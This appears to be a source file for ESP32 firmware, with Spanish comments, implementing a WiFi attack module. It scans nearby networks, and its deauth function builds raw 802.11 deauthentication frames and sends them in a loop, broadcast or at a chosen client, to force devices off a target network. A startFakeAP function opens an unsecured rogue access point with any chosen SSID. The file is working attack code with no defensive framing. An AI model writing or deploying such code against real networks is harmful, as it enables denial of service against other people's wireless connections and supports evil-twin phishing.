#include "wifi_module.h"
#include "esp_wifi.h"

WiFiModule WiFiMod;

static const uint8_t DEAUTH_TMPL[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destino (Cliente)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Origen (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Secuencia
    0x07, 0x00                          // Razón del código (7: Class 3 frame received from nonassociated STA)
};

bool WiFiModule::begin() {
    WiFi.mode(WIFI_MODE_NULL);
    _ready = true;
    return true;
}

void WiFiModule::scan(JsonDocument& result) {
    if (!_ready) {
        result["success"] = false;
        result["error"] = "wifi offline";
        return;
    }

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks(false, true);
    JsonArray nets = result["networks"].to<JsonArray>();

    result["success"] = true;
    result["count"] = n;

    for (int i = 0; i < n && i < 30; i++) {
        JsonObject o = nets.add<JsonObject>();
        o["ssid"] = WiFi.SSID(i);
        o["bssid"] = WiFi.BSSIDstr(i);
        o["channel"] = WiFi.channel(i);
        o["rssi"] = WiFi.RSSI(i);
        o["encryption"] = _encStr(WiFi.encryptionType(i));
    }

    WiFi.scanDelete();
    WiFi.mode(WIFI_MODE_NULL);
}

void WiFiModule::deauth(const char* bssidStr, const char* clientStr, int channel, int count) {
    if (!_ready) return;

    uint8_t bssid[6];
    uint8_t client[6];

    _parseMac(bssidStr, bssid);

    bool broadcast = strcmp(clientStr, "FF:FF:FF:FF:FF:FF") == 0 ||
                     strcmp(clientStr, "broadcast") == 0;

    if (broadcast)
        memset(client, 0xFF, 6);
    else
        _parseMac(clientStr, client);

    // SOLUCIÓN: Encender la radio en modo STA obligatoriamente antes de interactuar con el SDK bajo nivel
    WiFi.mode(WIFI_STA); 
    delay(10);

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint8_t frame[26];
    memcpy(frame, DEAUTH_TMPL, 26);
    memcpy(frame + 4, client, 6);
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);

    for (int i = 0; i < count; i++) {
        frame[22] = i & 0xFF;
        frame[23] = (i >> 8) & 0x0F;

        // Cambiado a WIFI_IF_STA ya que operamos forzando ese modo
        esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
        delay(2); // Un delay ligeramente superior evita saturar el buffer interno del ESP32
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_MODE_NULL);
}

void WiFiModule::startFakeAP(const char* ssid, int channel) {
    if (!_ready) return;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, nullptr, channel);
    _fakeAP = true;
}

void WiFiModule::stopFakeAP() {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_NULL);
    _fakeAP = false;
}

void WiFiModule::_parseMac(const char* s, uint8_t* mac) {
    sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

String WiFiModule::_encStr(wifi_auth_mode_t m) {
    switch (m) {
        case WIFI_AUTH_OPEN:           return "OPEN";
        case WIFI_AUTH_WEP:            return "WEP";
        case WIFI_AUTH_WPA_PSK:        return "WPA";
        case WIFI_AUTH_WPA2_PSK:       return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:   return "WPA/WPA2";
        case WIFI_AUTH_WPA3_PSK:       return "WPA3";
        default:                       return "UNKNOWN";
    }
}
